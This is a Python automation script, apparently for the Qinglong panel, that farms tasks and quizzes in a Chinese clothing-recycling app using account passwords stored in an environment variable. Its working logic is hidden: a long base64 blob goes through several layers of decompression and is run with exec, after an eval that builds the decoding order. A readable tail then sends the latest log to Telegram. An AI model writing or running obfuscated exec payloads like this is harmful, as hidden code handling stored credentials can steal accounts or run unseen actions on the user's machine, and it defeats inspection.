import requests
import json
import os
# 环境变量:bjy_account，格式：账号1#密码#id#sign
#多账号用回车分隔
#不答题就不要id和sign
#2.0更新了答题需要你抓包答题id和sign
#抓包路径 首页环保答题→先开启抓包→点开始答题 答题一个就可以 答案是响应数据的isright为1的 错误也可以 提交过后看get请求头(搜question)
#app叫:白鲸鱼旧衣服回收(包名:com.fangxd.baijingyu)
#你们自己去应用商店上搜 https://www.52bjy.com/app/
#第1次登录验证码登录 最后在我的→右上角设置→账号安全→修改登录密码
import base64,zlib,lzma,gzip,bz2
BASE62_CHARS="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
def _base62_dec(d):
 d_s=d.decode();n=0
 for c in d_s:n=n*62+BASE62_CHARS.index(c)
 return n.to_bytes((n.bit_length()+7)//8,"big")if n else b"\x00"
def d(d,ops):
 for op in reversed(ops):
  d=zlib.decompress(d)if op=="zlib"else lzma.decompress(d)if op=="lzma"else gzip.decompress(d)if op=="gzip"else bz2.decompress(d)if op=="bz2"else base64.b64decode(d)if op=="base64"else base64.b32decode(d)if op=="base32"else _base62_dec(d)if op=="base62"else base64.b85decode(d)
 return d.decode()
e,b="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";o=eval(base64.b64decode(b).decode())
try:exec(d(base64.b64decode(e),o))
except Exception as x:print(f"Error:{x}")
import os
import glob
import requests
from datetime import datetime

# 从环境变量中读取 Telegram 机器人Token和用户ID
TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
TG_USER_ID = os.getenv("TG_USER_ID")

if not TG_BOT_TOKEN or not TG_USER_ID:
    raise ValueError("请在环境变量中设置 TG_BOT_TOKEN 和 TG_USER_ID")

def push_to_tg(script_name, log_time, log_content):
    title = f"【{script_name}】_ {log_time}"
    msg = f"{title}\n\n{log_content}"
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TG_USER_ID,
        "text": msg,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print(f"✅ TG推送成功: {title}")
        else:
            print(f"❌ TG推送失败，状态码: {response.status_code}, 内容: {response.text}")
    except Exception as e:
        print(f"❌ TG推送异常: {str(e)}")

def read_latest_ql_log(task_name_prefix, script_name, content_limit=2000):
    log_base_dir = "/ql/data/log"
    if not os.path.exists(log_base_dir):
        err = "❌ 青龙日志根目录不存在：/ql/data/log"
        print(err)
        return err
    
    task_dirs = glob.glob(os.path.join(log_base_dir, f"{task_name_prefix}*"))
    if not task_dirs:
        err = f"❌ 未找到[{task_name_prefix}]相关日志文件夹"
        print(err)
        return err
    
    latest_task_dir = max(task_dirs, key=os.path.getctime)
    all_files = [os.path.join(latest_task_dir, f) for f in os.listdir(latest_task_dir) if os.path.isfile(os.path.join(latest_task_dir, f))]
    if not all_files:
        err = f"❌ 文件夹[{latest_task_dir}]内无文件"
        print(err)
        return err
    
    latest_log_file = max(all_files, key=os.path.getctime)
    print(f"✅ 正在读取文件：{latest_log_file}")

    try:
        try:
            with open(latest_log_file, "r", encoding="utf-8", errors="ignore") as f:
                log_content = f.read()[:content_limit]
        except:
            with open(latest_log_file, "r", encoding="gbk", errors="ignore") as f:
                log_content = f.read()[:content_limit]
        
        log_time = datetime.fromtimestamp(os.path.getctime(latest_log_file)).strftime("%Y-%m-%d %H:%M")
        push_to_tg(script_name, log_time, log_content)
        
        return (
            f"✅ 内容读取完成\n"
            f"📄 读取文件：{latest_log_file}\n"
            f"📝 推送内容长度：{len(log_content)}字符\n"
            f"📱 已推送【{script_name}_信息_{log_time}】到Telegram"
        )
    except Exception as e:
        err = f"❌ 读取失败：{str(e)}"
        print(err)
        return err

if __name__ == "__main__":
    print("="*60)
    print("  青龙日志工具（深度提供）  ")
    print("="*60)
    current_script_name = os.path.splitext(os.path.basename(__file__))[0]
    result = read_latest_ql_log(task_name_prefix=current_script_name, script_name=current_script_name)
    print(f"\n{result}")
    print("\n" + "="*60)
 
